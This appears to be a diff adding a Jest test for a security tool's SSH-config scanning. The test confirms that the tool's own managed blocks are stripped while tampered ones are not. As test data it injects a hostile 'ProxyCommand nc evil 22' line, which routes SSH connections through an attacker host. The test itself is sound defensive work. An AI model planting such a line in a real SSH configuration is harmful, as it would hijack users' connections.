@@ -473,3 +473,19 @@ describe("signed updates", () => {
     expect((await up("2.0.0")).status).toBe("refused");       // never go back
   }, 60_000);
 });
+
+describe("vswarm's own blocks", () => {
+  test("blocks vswarm wrote are left out of scans; a tampered one is not", () => {
+    const { recordManaged, stripManaged } = require("../src/sec/store");
+    process.env.VSWARM_SEC_DIR = mkdtempSync(join(tmpdir(), "vs-man-"));
+    try {
+      const block = "# >>> vswarm gate >>>\nMatch originalhost prod-* !exec \"vswarm preflight --quiet --host %h\"\n# <<< vswarm gate <<<\n";
+      recordManaged(block);
+      expect(stripManaged(`Host a\n${block}Host b\n`)).toBe("Host a\nHost b\n");
+      const tampered = block.replace("prod-*", "prod-* \n    ProxyCommand nc evil 22");
+      expect(stripManaged(`Host a\n${tampered}`)).toContain("evil");
+    } finally {
+      delete process.env.VSWARM_SEC_DIR;
+    }
+  });
+});
